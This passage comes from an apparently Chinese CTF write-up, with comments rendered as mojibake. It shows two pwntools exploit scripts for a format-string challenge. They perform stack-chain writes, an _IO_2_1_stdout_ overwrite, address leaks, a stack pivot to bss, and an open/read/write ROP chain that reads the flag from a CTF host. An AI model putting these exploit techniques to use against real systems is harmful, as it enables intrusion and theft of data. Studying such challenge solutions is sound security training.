class="number">0xbbd</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ç¬¬äºŒæ¬¡é€šè¿‡æŒ‡å‘bufçš„æ ˆåœ°å€ï¼Œå°†bufä¿®æ”¹ä¸ºstdout&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ç¬¬ä¸‰æ¬¡é€šè¿‡stdoutå°†_IO_2_1_stdout_æ”¹æˆ_IO_2_1_stderr_å€¼ï¼Œæ­¤æ—¶éœ€è¦çˆ†ç ´å€’æ•°ç¬¬äºŒå­—èŠ‚çš„å‰åŠå­—èŠ‚ï¼ŒçŒœæµ‹ä¸º0ï¼Œæ¦‚ç‡1/16&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    stderr = io_stderr_addr &amp; <span class="number">0xfff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ä¸‹é¢æ¥åˆ¤æ–­æ˜¯å¦å°†stdoutæŒ‡å‘çš„å€¼æ”¹å†™æˆstderræŒ‡å‘çš„å€¼&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># main_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">    base_addr = main_addr - <span class="number">0xb24</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(base_addr))</span><br><span class="line">    pause()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_libc = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_libc-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(leak_libc))</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x21b97</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    rsp_hook = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_hook----------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_hook))</span><br><span class="line"></span><br><span class="line">    rsp_addr = rsp_addr + base_addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    rsp_addr = rsp_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    hook1 = (rsp_hook + <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hook1-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(hook1))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†menuå‡½æ•°çš„è¿”å›åœ°å€ä¿®æ”¹æˆpop rsp</span></span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å†™å…¥bssæ®µæŒ‡é’ˆ</span></span><br><span class="line">    bss_hook = rsp_hook + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¸ƒç½®è¿ç§»åœ°å€bss_addr+0x10  å› ä¸ºbssè¦å­˜æ”¾d^3CTF and flag</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pop_rdx_addr = <span class="number">0x1b96</span> + libc_base</span><br><span class="line">    pop_rdi_addr = base_addr + <span class="number">0xbc3</span></span><br><span class="line">    pop_rsi_r15_addr = base_addr + <span class="number">0xbc1</span></span><br><span class="line">    read_addr = <span class="number">0x110070</span> + libc_base</span><br><span class="line">    write_addr = libc_base + <span class="number">0x110140</span></span><br><span class="line">    open_addr = libc_base + <span class="number">0x10fc40</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># open(flag_addr,0)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(base_addr + <span class="number">0x202068</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(1,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write(2,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(<span class="number">2</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(write_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28285</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220429211253788-2009575560.png" alt="image-20220429204629254"></p><h2 id="2ã€ç”¨shellcodeæ‰§è¡Œorw"><a href="#2ã€ç”¨shellcodeæ‰§è¡Œorw" class="headerlink" title="2ã€ç”¨shellcodeæ‰§è¡Œorw"></a>2ã€ç”¨shellcodeæ‰§è¡Œorw</h2><p>è¿™ä¸ªæœ¬åœ°çœ‹åˆ°flagäº†ï¼Œä½†æ˜¯è¿œç¨‹æœ‰é—®é¢˜ï¼Œä¹Ÿåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwncli import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    io_stderr_addr = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;io_stderr_addr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(io_stderr_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    print_ret_addr = leak_addr - <span class="number">0x20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;print_ret_addr--------&gt;&#x27;</span>, <span class="built_in">hex</span>(print_ret_addr))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;æ„é€ æ ˆé“¾ï¼Œç¬¬ä¸€æ¬¡æ„é€ ä¸€ä¸ªæŒ‡å‘bufçš„æ ˆåœ°å€&#x27;&#x27;&#x27;</span></span><br><span class="line">    leak = (leak_addr) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    rsp_addr = <span class="number">0xbbd</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ç¬¬äºŒæ¬¡é€šè¿‡æŒ‡å‘bufçš„æ ˆåœ°å€ï¼Œå°†bufä¿®æ”¹ä¸ºstdout&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ç¬¬ä¸‰æ¬¡é€šè¿‡stdoutå°†_IO_2_1_stdout_æ”¹æˆ_IO_2_1_stderr_å€¼ï¼Œæ­¤æ—¶éœ€è¦çˆ†ç ´å€’æ•°ç¬¬äºŒå­—èŠ‚çš„å‰åŠå­—èŠ‚ï¼ŒçŒœæµ‹ä¸º0ï¼Œæ¦‚ç‡1/16&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    stderr = io_stderr_addr &amp; <span class="number">0xfff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ä¸‹é¢æ¥åˆ¤æ–­æ˜¯å¦å°†stdoutæŒ‡å‘çš„å€¼æ”¹å†™æˆstderræŒ‡å‘çš„å€¼&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># main_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">    base_addr = main_addr - <span class="number">0xb24</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(base_addr))</span><br><span class="line">    pause()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_libc=<span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_libc-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line">    libc_base = leak_libc- <span class="number">0x21b97</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    rsp_hook = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_hook----------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;one_gadget--------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">    high_addr = (one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;high_addr---------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(high_addr))</span><br><span class="line">    medium_addr = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;medium_addr-------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(medium_addr))</span><br><span class="line">    low_addr = (one_gadget) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;low_addr----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(low_addr))</span><br><span class="line"></span><br><span class="line">    rsp_addr = rsp_addr + base_addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    rsp_addr = rsp_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    hook1 = (rsp_hook + <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hook1-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(hook1))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†menuå‡½æ•°çš„è¿”å›åœ°å€ä¿®æ”¹æˆpop rsp</span></span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å†™å…¥bssæ®µæŒ‡é’ˆ</span></span><br><span class="line">    bss_hook = rsp_hook + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload=&#x27;%&#x27;+str(low_addr)+&#x27;c%10$hn&#x27;</span></span><br><span class="line">    <span class="comment"># p.sendline(payload.ljust(0x12c-1,&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#å¸ƒç½®è¿ç§»åœ°å€bss_addr+8  å› ä¸ºbssè¦å­˜æ”¾d^3CTF</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr+<span class="number">8</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># lb = LibcBox()</span></span><br><span class="line">    <span class="comment"># lb.add_symbol(&#x27;__libc_start_main&#x27;, leak_libc)  # è¿™ä¸ªåœ°æ–¹è·Ÿlibcsearcherç”¨æ³•åŸºæœ¬ä¸€æ ·ï¼Œä¸‹é¢ä¹Ÿæ˜¯å»dumpå‡ºæ¥</span></span><br><span class="line">    <span class="comment"># lb.search(download_so=1)</span></span><br><span class="line">    <span class="comment"># libc_base = puts_addr - lb.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"></span><br><span class="line">    mprotect_addr=libc_base+<span class="number">0x11bae0</span></span><br><span class="line">    read_addr=<span class="number">0x116600</span>+libc_base</span><br><span class="line">    write_addr=libc_base+<span class="number">0x1166a0</span></span><br><span class="line">    open_addr=libc_base+<span class="number">0x10fc40</span></span><br><span class="line">    <span class="comment">#mprotect(bss_addr,0x100000,7)</span></span><br><span class="line">    csu1_gadget=base_addr+<span class="number">0xbba</span></span><br><span class="line">    pop_rdx_addr=<span class="number">0x1b96</span>+libc_base</span><br><span class="line">    term_proc=base_addr+<span class="number">0x201DB8</span></span><br><span class="line">    magic_gadget=base_addr+<span class="number">0x8de</span></span><br><span class="line">    pop_rdi_addr=base_addr+<span class="number">0xbc3</span></span><br><span class="line">    pop_rsi_r15_addr=base_addr+<span class="number">0xbc1</span></span><br><span class="line">    </span><br><span class="line">    exit_addr=<span class="number">0x43120</span>+libc_base</span><br><span class="line">    alarm_offset=<span class="number">0xe44f0</span></span><br><span class="line">    alarm_got_addr=<span class="number">0x201FB0</span>+base_addr</span><br><span class="line">    